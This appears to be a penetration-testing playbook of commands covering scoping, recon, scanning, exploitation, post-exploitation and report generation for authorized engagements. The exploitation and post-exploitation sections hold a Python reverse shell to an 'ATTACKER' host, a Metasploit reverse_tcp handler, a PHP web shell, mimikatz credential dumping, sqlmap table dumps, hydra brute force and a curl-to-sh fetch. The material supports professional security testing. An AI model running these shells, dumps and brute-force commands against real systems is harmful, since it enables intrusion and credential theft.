# Engagement Manager — Payloads & Commands

This document provides comprehensive engagement management commands, workflow templates, and operational scripts for orchestrating full penetration testing engagements from scoping through final report delivery.

## Engagement Setup and Initialization

Engagement setup establishes the operational foundation for a penetration test, including target configuration, scope definition, team assignment, and workspace preparation. Proper initialization ensures all subsequent phases execute within approved boundaries.

### Target Configuration

```bash
# Initialize engagement workspace with target configuration
bash validation/orchestrator.sh -t targets.json -o engagement/

# Dry-run to preview all phases without execution
bash validation/orchestrator.sh -t targets.json --dry-run

# Initialize with specific engagement type
bash validation/orchestrator.sh -t targets.json --type web -o engagement/web-test/

# Initialize multi-target engagement
bash validation/orchestrator.sh -t targets_multi.json -o engagement/multi-target/

# Create engagement directory structure
mkdir -p engagement/{evidence/{recon,scan,enum,vuln,exploit,postexp},logs,reports,scope}
```

### Scope Definition and Verification

```bash
# Initialize scope configuration from template
cp validation/engagement-template/scope-rules.json.example engagement/scope/scope-rules.json

# Validate scope configuration
cat engagement/scope/scope-rules.json | python3 -m json.tool

# Verify target reachability before engagement
for target in $(cat engagement/scope/targets.txt); do
    ping -c 1 -W 2 "$target" && echo "$target: REACHABLE" || echo "$target: UNREACHABLE"
done | tee engagement/logs/reachability_check.txt

# Run drift detection against baseline
bash validation/drift-detect.sh --create-baseline engagement/scope/scope-rules.json

# Validate scope against approved boundaries
bash validation/orchestrator.sh -t targets.json --validate-scope-only
```

### Workspace Environment Setup

```bash
# Create standardized engagement directory structure
mkdir -p engagement/
mkdir -p engagement/evidence/{recon,scan,enum,vuln,exploit,postexp}
mkdir -p engagement/logs/
mkdir -p engagement/reports/
mkdir -p engagement/scope/
mkdir -p engagement/state/
touch engagement/state/checkpoint.json
touch engagement/state/metadata.txt

# Initialize engagement metadata
cat > engagement/state/metadata.txt <<EOF
Engagement ID: ENG-$(date +%Y%m%d-%H%M%S)
Start Date: $(date -u +"%Y-%m-%dT%H:%M:%SZ")
Status: INITIALIZED
Phase: SETUP
Operator: $(whoami)
EOF

# Backup workspace before engagement
bash validation/auto-backup.sh --create engagement/

# Verify tool availability for engagement
for tool in nmap nuclei sqlmap ffuf hydra; do
    which "$tool" && echo "$tool: AVAILABLE" || echo "$tool: MISSING"
done | tee engagement/logs/tool_check.txt
```

## Kill Chain Phase Execution

The kill chain defines the sequential phases of a penetration test engagement. Each phase produces structured evidence that feeds into subsequent phases through standardized data handoff protocols.

### Phase 1: Reconnaissance Commands

```bash
# Subdomain enumeration with output capture
subfinder -d TARGET -all -v | sort -u > engagement/evidence/recon/subdomains.txt

# Deep subdomain enumeration with amass
amass enum -passive -d TARGET -o engagement/evidence/recon/amass_subs.txt

# Technology fingerprinting
whatweb -v -a 3 https://TARGET > engagement/evidence/recon/techstack.txt

# Email harvesting
theHarvester -d TARGET -b all -l 500 > engagement/evidence/recon/emails.txt

# HTTP probing of discovered subdomains
cat engagement/evidence/recon/subdomains.txt | httpx -status-code -title -tech-detect > engagement/evidence/recon/alive_hosts.txt

# URL discovery from historical records
waybackurls TARGET | sort -u > engagement/evidence/recon/wayback_urls.txt
gau TARGET | sort -u > engagement/evidence/recon/gau_urls.txt

# DNS enumeration
dnsrecon -d TARGET -t std -o engagement/evidence/recon/dns_records.txt
dnsrecon -d TARGET -t axfr 2>&1 | tee engagement/evidence/recon/dns_zone_transfer.txt

# Document metadata extraction
metagoofil -d TARGET -t pdf,doc,xls -l 50 -n 20 -o engagement/evidence/recon/metadata/

# Timestamp and phase completion
echo "RECON_COMPLETE: $(date -u +"%Y-%m-%dT%H:%M:%SZ")" >> engagement/state/metadata.txt
```

### Phase 2: Scanning Commands

```bash
# Comprehensive port scan with service detection
nmap -sS -sV -sC -O -p- -T4 TARGET -oA engagement/evidence/scan/fullscan

# Targeted vulnerability scan with nmap scripts
nmap --script vuln -p 80,443,8080 TARGET -oA engagement/evidence/scan/vuln_scan

# Nuclei vulnerability scanning with severity filtering
nuclei -u TARGET -t cves/ -t vulnerabilities/ -severity critical,high -o engagement/evidence/scan/nuclei_critical.txt

# SSL/TLS security assessment
testssl TARGET --full --htmlfile engagement/evidence/scan/testssl_report.html

# UDP scan for common services
nmap -sU -p 53,67,123,161,500,514 -T4 TARGET -oA engagement/evidence/scan/udp_scan

# Service-specific enumeration
nmap -sV --script=mysql-info -p 3306 TARGET -oA engagement/evidence/scan/mysql_enum
nmap -sV --script=ms-sql-info -p 1433 TARGET -oA engagement/evidence/scan/mssql_enum
nmap -sV --script=smtp-open-relay -p 25 TARGET -oA engagement/evidence/scan/smtp_enum

# Timestamp and phase completion
echo "SCAN_COMPLETE: $(date -u +"%Y-%m-%dT%H:%M:%SZ")" >> engagement/state/metadata.txt
```

### Phase 3: Enumeration Commands

```bash
# Directory brute-forcing with ffuf
ffuf -u TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -o engagement/evidence/enum/dirs_ffuf.json

# Recursive directory discovery with feroxbuster
feroxbuster -u TARGET -w /usr/share/wordlists/dirb/common.txt -d 3 -o engagement/evidence/enum/dirs_ferox.txt

# API endpoint discovery with kiterunner
kiterunner scan TARGET -x 20 -w routes.kite -o engagement/evidence/enum/api_endpoints.txt

# Parameter discovery with arjun
arjun -u TARGET/endpoint -m GET,POST -o engagement/evidence/enum/params_arjun.json

# SMB enumeration
enum4linux -a TARGET > engagement/evidence/enum/smb_enum.txt
smbclient -L //TARGET -N > engagement/evidence/enum/smb_shares.txt

# LDAP enumeration
ldapsearch -x -H ldap://TARGET -b "dc=target,dc=com" > engagement/evidence/enum/ldap_dump.txt

# SNMP enumeration
snmpwalk -v2c -c public TARGET > engagement/evidence/enum/snmp_walk.txt
onesixtyone -c communities.txt TARGET > engagement/evidence/enum/snmp_community.txt

# Timestamp and phase completion
echo "ENUM_COMPLETE: $(date -u +"%Y-%m-%dT%H:%M:%SZ")" >> engagement/state/metadata.txt
```

### Phase 4: Vulnerability Discovery Commands

```bash
# SQL injection testing with sqlmap
sqlmap -u "TARGET/page?id=1" --batch --dbs --level=3 --risk=2 > engagement/evidence/vuln/sqli_results.txt

# XSS scanning with dalfox
dalfox url TARGET --blind https://BLIND.xss.ht -o engagement/evidence/vuln/xss_results.txt

# Nuclei vulnerability scan with all templates
nuclei -u TARGET -t cves/ -t vulnerabilities/ -t misconfiguration/ -t exposures/ -o engagement/evidence/vuln/nuclei_all.txt

# Authentication testing with hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect" -o engagement/evidence/vuln/brute_results.txt

# SSRF testing with manual probes
for proto in http https gopher file dict; do
    curl -s -o /dev/null -w "%{http_code}" "TARGET/fetch?url=${proto}://INTERNAL_HOST" | tee -a engagement/evidence/vuln/ssrf_probes.txt
done

# JWT token analysis
python3 jwt_tool.py TARGET_TOKEN -t
python3 jwt_tool.py TARGET_TOKEN -X a -nl

# Timestamp and phase completion
echo "VULN_COMPLETE: $(date -u +"%Y-%m-%dT%H:%M:%SZ")" >> engagement/state/metadata.txt
```

### Phase 5: Exploitation Commands

```bash
# SQL injection exploitation — dump database
sqlmap -u "TARGET/page?id=1" --batch --dump -D dbname -T users --threads=5 > engagement/evidence/exploit/sqli_dump.txt

# Metasploit exploitation via resource script
cat > engagement/evidence/exploit/exploit.rc <<'RC'
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST LOCAL_IP
set LPORT 4444
set AutoRunScript post/windows/manage/migrate
run
RC
msfconsole -r engagement/evidence/exploit/exploit.rc

# Credential brute force with results capture
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET ssh -t 4 -o engagement/evidence/exploit/hydra_ssh.txt

# Reverse shell listener
nc -lvnp 4444 | tee engagement/evidence/exploit/shell_log.txt

# Python reverse shell payload
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP web shell upload (for authorized testing)
echo '<?php system($_GET["cmd"]); ?>' > engagement/evidence/exploit/simple_shell.php

# Timestamp and phase completion
echo "EXPLOIT_COMPLETE: $(date -u +"%Y-%m-%dT%H:%M:%SZ")" >> engagement/state/metadata.txt
```

### Phase 6: Post-Exploitation Commands

```bash
# Linux privilege escalation enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>&1 | tee engagement/evidence/postexp/linpeas_output.txt

# Windows privilege escalation enumeration
winpeas.exe fast cmd 2>&1 | tee engagement/evidence/postexp/winpeas_output.txt

# Credential extraction with mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" 2>&1 | tee engagement/evidence/postexp/mimikatz_creds.txt

# Network pivot and tunneling
chisel server --reverse -p 8080
chisel client ATTACKER:8080 R:socks

# Lateral movement enumeration
crackmapexec smb SUBNET -u user -p pass --shares 2>&1 | tee engagement/evidence/postexp/lateral_shares.txt
crackmapexec smb SUBNET -u user -p pass --sam 2>&1 | tee engagement/evidence/postexp/lateral_sam.txt

# Data exfiltration simulation (scope-permitted)
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | head -50 > engagement/evidence/postexp/sensitive_files.txt

# Persistence check (documentation only — do not install)
echo "Checking common persistence locations..." > engagement/evidence/postexp/persistence_check.txt
ls -la /etc/cron* >> engagement/evidence/postexp/persistence_check.txt 2>/dev/null
cat /etc/rc.local >> engagement/evidence/postexp/persistence_check.txt 2>/dev/null

# Timestamp and phase completion
echo "POSTEXP_COMPLETE: $(date -u +"%Y-%m-%dT%H:%M:%SZ")" >> engagement/state/metadata.txt
```

## Tool Selection by Phase

Tool selection maps target types and engagement phases to appropriate security tools. Automated tool selection ensures consistent coverage across engagements and reduces the risk of missing critical attack surfaces.

### Automated Tool Selection

```bash
# Get tools for specific target type and phase
bash validation/tool-selector.sh --target-type web --phase recon
bash validation/tool-selector.sh --target-type web --phase scan
bash validation/tool-selector.sh --target-type web --phase exploit

# Stealth mode tool selection
bash validation/tool-selector.sh --target-type network --stealth --format commands

# JSON output for programmatic integration
bash validation/tool-selector.sh --target-type api --format json

# Markdown report of recommended tools
bash validation/tool-selector.sh --target-type cloud --format markdown -o engagement/scope/tool_plan.md
```

### Target Type to Tool Mapping

```bash
# Web application tool chain
echo "=== Web Application Tool Chain ===" > engagement/scope/tool_chain.txt
echo "Recon: subfinder, amass, whatweb, httpx" >> engagement/scope/tool_chain.txt
echo "Scan: nmap, nuclei, nikto, testssl" >> engagement/scope/tool_chain.txt
echo "Enum: ffuf, gobuster, kiterunner, arjun" >> engagement/scope/tool_chain.txt
echo "Vuln: sqlmap, dalfox, commix" >> engagement/scope/tool_chain.txt
echo "Exploit: hydra, burpsuite, sqlmap" >> engagement/scope/tool_chain.txt
echo "PostExp: linpeas, chisel, crackmapexec" >> engagement/scope/tool_chain.txt

# Cloud assessment tool chain
echo "=== Cloud Assessment Tool Chain ===" > engagement/scope/cloud_tools.txt
echo "Recon: subfinder, cloudlist, s3scanner" >> engagement/scope/cloud_tools.txt
echo "Enum: scoutSuite, cloudsploit, pmapper" >> engagement/scope/cloud_tools.txt
echo "Exploit: pacu, cloudfox, iam-forbidden" >> engagement/scope/cloud_tools.txt

# Internal network tool chain
echo "=== Internal Network Tool Chain ===" > engagement/scope/network_tools.txt
echo "Recon: arp-scan, netdiscover, responder" >> engagement/scope/network_tools.txt
echo "Scan: nmap, masscan, crackmapexec" >> engagement/scope/network_tools.txt
echo "Enum: enum4linux, ldapsearch, snmpwalk" >> engagement/scope/network_tools.txt
echo "Exploit: impacket-psexec, evil-winrm, hydra" >> engagement/scope/network_tools.txt
echo "PostExp: mimikatz, chisel, ligolo-ng" >> engagement/scope/network_tools.txt

# API security tool chain
echo "=== API Security Tool Chain ===" > engagement/scope/api_tools.txt
echo "Recon: kiterunner, postman, swagger-parser" >> engagement/scope/api_tools.txt
echo "Scan: nuclei, burpsuite, arjun" >> engagement/scope/api_tools.txt
echo "Enum: ffuf, arjun, auth-header" >> engagement/scope/api_tools.txt
echo "Exploit: sqlmap, jwt_tool, burpsuite" >> engagement/scope/api_tools.txt
```

## Evidence Collection and Chain Management

Evidence collection ensures all findings are documented with timestamps, cross-references, and sufficient detail for independent verification. The evidence chain must remain intact from discovery through report delivery.

### Finding Documentation

```bash
# Create structured finding entry
cat > engagement/evidence/vuln/F-$(printf "%03d" 1).md <<EOF
### Finding 001: [Finding Title]
- **Severity**: CRITICAL
- **CVSS**: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Asset**: TARGET_HOSTNAME
- **Phase**: vuln
- **Status**: Confirmed
- **Discovered**: $(date -u +"%Y-%m-%dT%H:%M:%SZ")

#### Proof of Concept
\`\`\`bash
# Commands to reproduce the finding
sqlmap -u "TARGET/page?id=1" --batch --dbs
\`\`\`

#### Impact
[Business impact description]

#### Remediation
[Specific fix recommendations]
EOF

# Generate evidence checksums for integrity verification
cd engagement/evidence && find . -type f -exec sha256sum {} \; > ../state/evidence_checksums.txt

# Verify evidence integrity after collection
cd engagement && sha256sum -c state/evidence_checksums.txt
```

### Checkpoint and State Management

```bash
# Create phase checkpoint
cat > engagement/state/checkpoint.json <<EOF
{
    "engagement_id": "ENG-$(date +%Y%m%d)",
    "completed_phases": ["recon", "scan"],
    "current_phase": "enum",
    "next_phase": 4,
    "last_update": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")",
    "findings_count": 0,
    "critical_findings": 0
}
EOF

# Update checkpoint after each phase
python3 -c "
import json, datetime
with open('engagement/state/checkpoint.json') as f:
    state = json.load(f)
state['completed_phases'].append('enum')
state['current_phase'] = 'vuln'
state['next_phase'] = 5
state['last_update'] = datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ')
with open('engagement/state/checkpoint.json', 'w') as f:
    json.dump(state, f, indent=4)
"

# Query engagement state
cat engagement/state/checkpoint.json | python3 -m json.tool
```

## Session Management

Session management tracks the operational state of an engagement, enabling pause and resume functionality, team coordination, and time tracking across multi-day assessments.

### Engagement Resume

```bash
# Resume from last checkpoint
bash validation/orchestrator.sh -t targets.json --resume
```

```bash
# Resume from specific phase
bash validation/orchestrator.sh -t targets.json --resume --phase enum
```

```bash
# Check engagement status after resume
cat engagement/state/checkpoint.json | python3 -m json.tool
cat engagement/state/metadata.txt
```

### Time Tracking

```bash
# Log session start time
echo "SESSION_START: $(date -u +"%Y-%m-%dT%H:%M:%SZ")" >> engagement/logs/time_tracking.log
```

```bash
# Calculate elapsed time per phase from metadata
awk '
/^RECON_COMPLETE/ { recon=$3 }
/^SCAN_COMPLETE/ { scan=$3 }
/^ENUM_COMPLETE/ { enum=$3 }
/^VULN_COMPLETE/ { vuln=$3 }
/^EXPLOIT_COMPLETE/ { exploit=$3 }
/^POSTEXP_COMPLETE/ { postexp=$3 }
END {
    print "Recon to Scan: " recon " -> " scan
    print "Scan to Enum: " scan " -> " enum
    print "Enum to Vuln: " enum " -> " vuln
    print "Vuln to Exploit: " vuln " -> " exploit
    print "Exploit to PostExp: " exploit " -> " postexp
}
' engagement/state/metadata.txt
```

```bash
# Session end logging
echo "SESSION_END: $(date -u +"%Y-%m-%dT%H:%M:%SZ")" >> engagement/logs/time_tracking.log
```

### Multi-Operator Coordination

```bash
# Lock engagement phase for specific operator
echo "LOCKED:enum:operator1:$(date -u +"%Y-%m-%dT%H:%M:%SZ")" >> engagement/state/locks.txt
```

```bash
# Release phase lock after completion
echo "RELEASED:enum:operator1:$(date -u +"%Y-%m-%dT%H:%M:%SZ")" >> engagement/state/locks.txt
```

```bash
# View engagement activity log for coordination
tail -20 engagement/logs/activity.log
```

## Client Communication

Client communication templates ensure professional, consistent updates throughout the engagement. Critical findings require immediate notification within the agreed-upon timeframe.

### Status Updates

```bash
# Generate daily status update
cat > engagement/reports/status_update_$(date +%Y%m%d).md <<EOF
# Engagement Status Update — $(date +%Y-%m-%d)

## Engagement: [Client Name] Penetration Test
## Status: In Progress

### Completed Phases
$(cat engagement/state/checkpoint.json | python3 -c "import sys,json; d=json.load(sys.stdin); print('\n'.join(['- '+p.title() for p in d['completed_phases']]))")

### Current Phase
$(cat engagement/state/checkpoint.json | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['current_phase'].title())")

### Findings Summary
- Critical: 0
- High: 0
- Medium: 0
- Low: 0

### Next Steps
[Planned activities for next session]

### Notes
[Any blockers, scope questions, or client action items]
EOF
```

### Critical Finding Notification

```bash
# Critical finding notification template
cat > engagement/reports/critical_notification_$(date +%Y%m%d).md <<EOF
# CRITICAL FINDING NOTIFICATION

**Engagement**: [Client Name] Penetration Test
**Date**: $(date -u +"%Y-%m-%dT%H:%M:%SZ")
**Finding ID**: F-001
**Severity**: CRITICAL

## Summary
[One-line description of the critical finding]

## Impact
[Business impact of the vulnerability]

## Immediate Recommendation
[Suggested immediate action to mitigate risk]

## Next Steps
[Recommended follow-up actions]

---
This notification was generated in accordance with the Rules of Engagement
requiring critical finding disclosure within 4 hours of discovery.
EOF

# Mark notification as sent
echo "CRITICAL_NOTIFICATION_SENT: F-001: $(date -u +"%Y-%m-%dT%H:%M:%SZ")" >> engagement/logs/notifications.log
```

## Report Generation

Report generation compiles all collected evidence into a professional deliverable. Reports must include an executive summary, detailed technical findings, and actionable remediation recommendations.

### Automated Report Generation

```bash
# Generate markdown report from evidence
bash validation/report-generator.sh -s engagement/ -o engagement/reports/final_report.md
```

```bash
# Generate HTML report with styling
bash validation/report-generator.sh -s engagement/ -o engagement/reports/final_report.html --format html
```

```bash
# Generate JSON report for integration with tracking systems
bash validation/report-generator.sh -s engagement/ -o engagement/reports/findings.json --format json
```

```bash
# Generate executive summary only for quick stakeholder review
bash validation/report-generator.sh -s engagement/ -o engagement/reports/executive_summary.md --format executive
```

### Manual Report Assembly

```bash
# Assemble report from phase evidence
cat > engagement/reports/full_report.md <<'REPORT'
# Penetration Test Report

## 1. Executive Summary
[High-level overview of engagement scope, findings, and risk posture]

## 2. Scope and Methodology
### 2.1 Scope
[Approved targets, exclusions, testing window]

### 2.2 Methodology
[Kill chain phases executed, tools used]

## 3. Findings Summary
| ID | Finding | Severity | CVSS | Status |
|----|---------|----------|------|--------|
REPORT

# Append findings from evidence files
for finding in engagement/evidence/vuln/F-*.md; do
    echo "" >> engagement/reports/full_report.md
    cat "$finding" >> engagement/reports/full_report.md
done

# Append remediation summary
cat >> engagement/reports/full_report.md <<'FOOTER'

## 4. Remediation Priorities
### Critical (Immediate)
[List critical remediation actions]

### High (Within 7 days)
[List high-priority remediation actions]

### Medium (Within 30 days)
[List medium-priority remediation actions]

### Low (Next quarter)
[List low-priority remediation actions]

## 5. Appendix
### A. Tool Inventory
### B. Raw Evidence Index
### C. Scope Document
FOOTER
```

### Findings Severity Summary

```bash
# Count findings by severity from evidence files
echo "=== Findings Severity Distribution ==="
grep -r "Severity.*CRITICAL" engagement/evidence/ | wc -l | xargs echo "Critical:"
grep -r "Severity.*HIGH" engagement/evidence/ | wc -l | xargs echo "High:"
grep -r "Severity.*MEDIUM" engagement/evidence/ | wc -l | xargs echo "Medium:"
grep -r "Severity.*LOW" engagement/evidence/ | wc -l | xargs echo "Low:"

# Generate findings CSV for tracking
echo "ID,Title,Severity,CVSS,Asset,Status" > engagement/reports/findings_summary.csv
for f in engagement/evidence/vuln/F-*.md; do
    id=$(basename "$f" .md)
    title=$(grep -oP '(?<=Finding ).*(?=[:])' "$f" | head -1)
    severity=$(grep -oP '(?<=Severity[*]: ).*' "$f" | head -1)
    cvss=$(grep -oP '(?<=CVSS[*]: ).*' "$f" | head -1 | cut -d' ' -f1)
    asset=$(grep -oP '(?<=Asset[*]: ).*' "$f" | head -1)
    status=$(grep -oP '(?<=Status[*]: ).*' "$f" | head -1)
    echo "$id,\"$title\",$severity,$cvss,$asset,$status" >> engagement/reports/findings_summary.csv
done
```

## Quality Assurance

Quality assurance validates that all engagement deliverables meet professional standards, evidence is complete, and findings are reproducible. QA should be performed before final report delivery.

### Evidence Validation

```bash
# Verify all evidence files have content
find engagement/evidence/ -type f -name "*.txt" -empty -exec echo "EMPTY: {}" \;

# Verify evidence checksums match
cd engagement && sha256sum -c state/evidence_checksums.txt 2>&1 | grep -i "failed"

# Validate all findings have required fields
for f in engagement/evidence/vuln/F-*.md; do
    echo "Checking $f..."
    grep -q "Severity" "$f" || echo "  MISSING: Severity"
    grep -q "CVSS" "$f" || echo "  MISSING: CVSS"
    grep -q "Asset" "$f" || echo "  MISSING: Asset"
    grep -q "Proof of Concept" "$f" || echo "  MISSING: PoC"
    grep -q "Remediation" "$f" || echo "  MISSING: Remediation"
    grep -q "Impact" "$f" || echo "  MISSING: Impact"
done

# Verify phase completion
python3 -c "
import json
with open('engagement/state/checkpoint.json') as f:
    state = json.load(f)
expected = ['recon','scan','enum','vuln','exploit','postexp']
completed = state['completed_phases']
missing = [p for p in expected if p not in completed]
if missing:
    print('INCOMPLETE PHASES:', ', '.join(missing))
else:
    print('ALL PHASES COMPLETE')
"
```

### Report Quality Check

```bash
# Verify report has all required sections
report="engagement/reports/final_report.md"
grep -q "Executive Summary" "$report" || echo "MISSING: Executive Summary"
grep -q "Scope" "$report" || echo "MISSING: Scope"
grep -q "Methodology" "$report" || echo "MISSING: Methodology"
grep -q "Remediation" "$report" || echo "MISSING: Remediation"
grep -q "Finding" "$report" || echo "MISSING: Findings"

# Check report word count
wc -w "$report"

# Verify no placeholder text remains
grep -n "\[.*\]" "$report" | head -20
```

### Drift Detection

```bash
# Run drift detection against baseline configuration
bash validation/drift-detect.sh
```

```bash
# Update baseline after approved scope changes
bash validation/drift-detect.sh --update-baseline
```

```bash
# Compare current scope against original approved scope
bash validation/drift-detect.sh --compare engagement/scope/scope-rules.json
```

## Data Handoff Reference

The data handoff table defines the standardized interfaces between kill chain phases. Each phase produces specific output formats that the next phase consumes as input.

| From Phase | To Phase | Data File | Format |
|-----------|----------|-----------|--------|
| recon | scan | subdomains.txt, alive_hosts.txt | One host per line |
| scan | enum | fullscan.nmap, services.txt | Nmap XML + text |
| enum | vuln | dirs_ffuf.json, api_endpoints.txt, params_arjun.json | JSON + text |
| vuln | exploit | vulnerabilities.json, nuclei_critical.txt | JSON + text |
| exploit | postexp | shells.txt, credentials.txt | Text |
| postexp | report | escalation_paths.txt, lateral_movement.txt, all evidence | Text + markdown |
| all | report | full_report.md, findings_summary.csv | Markdown + CSV |

| Finding Field | Required | Example |
|--------------|----------|---------|
| ID | Yes | F-001 |
| Severity | Yes | CRITICAL, HIGH, MEDIUM, LOW |
| CVSS | Yes | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| Asset | Yes | hostname, IP, or URL |
| Phase | Yes | recon, scan, enum, vuln, exploit, postexp |
| Status | Yes | Confirmed, Suspected, False Positive |
| PoC | Yes | Reproducible commands and output |
| Impact | Yes | Business and technical impact description |
| Remediation | Yes | Specific steps to fix the vulnerability |
| Discovered | Yes | ISO 8601 UTC timestamp |

---

## Engagement Closeout and Cleanup

### Final Evidence Packaging

```bash
# Package all engagement evidence into a single encrypted archive
tar czf - engagement/ | gpg --symmetric --cipher-algo AES256 -o engagement_evidence_$(date +%Y%m%d).tar.gz.gpg

# Verify the encrypted archive
gpg --decrypt engagement_evidence_$(date +%Y%m%d).tar.gz.gpg | tar tzf - | head -20
```

### Engagement Cleanup Script

```bash
#!/bin/bash
# Post-engagement cleanup: remove temp files, secure-delete sensitive data
ENGAGEMENT_DIR="${1:?Usage: $0 <engagement_dir>}"

echo "[1] Removing temporary scan files"
find "$ENGAGEMENT_DIR" -name "*.tmp" -delete

echo "[2] Securely deleting sensitive evidence (after client acceptance)"
# Only run after client has accepted the final report
find "$ENGAGEMENT_DIR/evidence" -name "*.pcap" -exec shred -vfz -n 3 {} \;
find "$ENGAGEMENT_DIR/evidence" -name "*.hash" -exec shred -vfz -n 3 {} \;

echo "[3] Removing engagement state files"
rm -f "$ENGAGEMENT_DIR/state/checkpoint.json"
rm -f "$ENGAGEMENT_DIR/state/locks.txt"

echo "[CLEANUP COMPLETE]"
```

### Scope Compliance Verification

```bash
# Verify all tested IPs were within approved scope
echo "=== Scope Compliance Verification ==="
APPROVED_SCOPE="engagement/scope/scope-rules.json"
TESTED_IPS=$(grep -rohE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' engagement/evidence/ | sort -u)

for ip in $TESTED_IPS; do
  python3 -c "
import json, ipaddress
with open('$APPROVED_SCOPE') as f:
    scope = json.load(f)
approved = [ipaddress.ip_network(n) for n in scope.get('approved_ranges', [])]
target = ipaddress.ip_address('$ip')
in_scope = any(target in net for net in approved)
print(f'$ip: {\"IN SCOPE\" if in_scope else \"OUT OF SCOPE - WARNING\"}')"
done
```

### Engagement Metrics Collection

```bash
# Collect engagement metrics for reporting
echo "=== Engagement Metrics ==="
echo "Total findings: $(find engagement/evidence/vuln/F-*.md 2>/dev/null | wc -l)"
echo "Critical findings: $(grep -rl "CRITICAL" engagement/evidence/vuln/ 2>/dev/null | wc -l)"
echo "High findings: $(grep -rl "HIGH" engagement/evidence/vuln/ 2>/dev/null | wc -l)"
echo "Medium findings: $(grep -rl "MEDIUM" engagement/evidence/vuln/ 2>/dev/null | wc -l)"
echo "Low findings: $(grep -rl "LOW" engagement/evidence/vuln/ 2>/dev/null | wc -l)"
echo "Total evidence files: $(find engagement/evidence/ -type f 2>/dev/null | wc -l)"
echo "Total screenshots: $(find engagement/evidence/ -name "*.png" -o -name "*.jpg" 2>/dev/null | wc -l)"
```

### Multi-Target Engagement Coordination

```bash
# Parallel scanning of multiple targets in scope
cat engagement/scope/targets.txt | xargs -P4 -I{} bash -c '
  TARGET={}
  mkdir -p engagement/evidence/$TARGET
  nmap -sV -oA engagement/evidence/$TARGET/nmap_scan $TARGET
  echo "Completed scan for $TARGET"
'
```

### Dradis API Evidence Upload

```bash
# Upload evidence to Dradis via API
DRADIS_URL="http://localhost:3000"
API_TOKEN="your-dradis-api-token"

# Upload a scan result file
curl -X POST "$DRADIS_URL/api/upload" \
  -H "Authorization: Bearer $API_TOKEN" \
  -F "file=@engagement/evidence/scan/nmap_scan.xml" \
  -F "category=nmap"

# Create a new finding note
curl -X POST "$DRADIS_URL/api/notes" \
  -H "Authorization: Bearer $API_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"SQL Injection - Login Page","text":"Confirmed SQL injection in login parameter","category":"finding"}'
```

### Engagement Timeline Generation

```bash
# Generate engagement timeline from metadata and evidence timestamps
python3 << 'PYEOF'
import os
import json
from datetime import datetime

timeline = []
evidence_dir = "engagement/evidence"
for root, dirs, files in os.walk(evidence_dir):
    for f in files:
        filepath = os.path.join(root, f)
        mtime = os.path.getmtime(filepath)
        phase = root.split("/")[-1] if "/" in root else "unknown"
        timeline.append({
            "timestamp": datetime.fromtimestamp(mtime).isoformat(),
            "phase": phase,
            "file": filepath
        })

timeline.sort(key=lambda x: x["timestamp"])
for entry in timeline:
    print(f"{entry['timestamp']} | {entry['phase']:10s} | {entry['file']}")
PYEOF
```

### Engagement Checklist Verification

```bash
# Verify all engagement phases are completed
echo "=== Engagement Checklist ==="
for phase in recon scan enum vuln exploit postexp; do
  count=$(find "engagement/evidence/$phase" -type f 2>/dev/null | wc -l)
  if [ "$count" -gt 0 ]; then
    echo "[x] $phase: $count evidence files"
  else
    echo "[ ] $phase: NO EVIDENCE FILES"
  fi
done

# Check for required deliverables
echo ""
echo "=== Deliverables ==="
[ -f "engagement/reports/final_report.md" ] && echo "[x] Final report" || echo "[ ] Final report MISSING"
[ -f "engagement/state/evidence_checksums.txt" ] && echo "[x] Evidence checksums" || echo "[ ] Evidence checksums MISSING"
[ -f "engagement/reports/findings_summary.csv" ] && echo "[x] Findings summary" || echo "[ ] Findings summary MISSING"
```

### Engagement Archive and Delivery

```bash
# Create encrypted engagement archive for client delivery
tar czf - engagement/reports/ engagement/evidence/ | \
  gpg --symmetric --cipher-algo AES256 -o client_delivery_$(date +%Y%m%d).tar.gz.gpg

# Split large archives for email delivery
split -b 25M client_delivery.tar.gz.gpg delivery_part_

# Verify archive integrity after transfer
gpg --decrypt client_delivery.tar.gz.gpg | tar tzf - | wc -l
```

### Engagement Retrospective Script

```bash
# Generate lessons learned document
cat > engagement/reports/retrospective.md <<EOF
# Engagement Retrospective

## Engagement Duration
$(awk '/SESSION_START/{start=$3} /SESSION_END/{end=$3} END{print "Start:", start, "End:", end}' engagement/logs/time_tracking.log)

## Tools Used
$(grep -rh "nmap\|sqlmap\|nuclei\|hydra\|ffuf\|burp" engagement/evidence/ 2>/dev/null | grep -oE '(nmap|sqlmap|nuclei|hydra|ffuf|burp|nikto|gobuster)' | sort | uniq -c | sort -rn)

## Findings Summary
Critical: $(grep -rl "CRITICAL" engagement/evidence/vuln/ 2>/dev/null | wc -l)
High: $(grep -rl "HIGH" engagement/evidence/vuln/ 2>/dev/null | wc -l)
Medium: $(grep -rl "MEDIUM" engagement/evidence/vuln/ 2>/dev/null | wc -l)
Low: $(grep -rl "LOW" engagement/evidence/vuln/ 2>/dev/null | wc -l)

## Recommendations for Future Engagements
- Document tool improvements for better coverage
- Note scope clarification items for Rules of Engagement updates
EOF
```

### Engagement Handoff Documentation

```bash
# Generate handoff document for continuity
cat > engagement/reports/handoff.md <<EOF
# Engagement Handoff Document

## Environment
- Target scope: $(cat engagement/scope/scope-rules.json | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('description','N/A'))" 2>/dev/null)
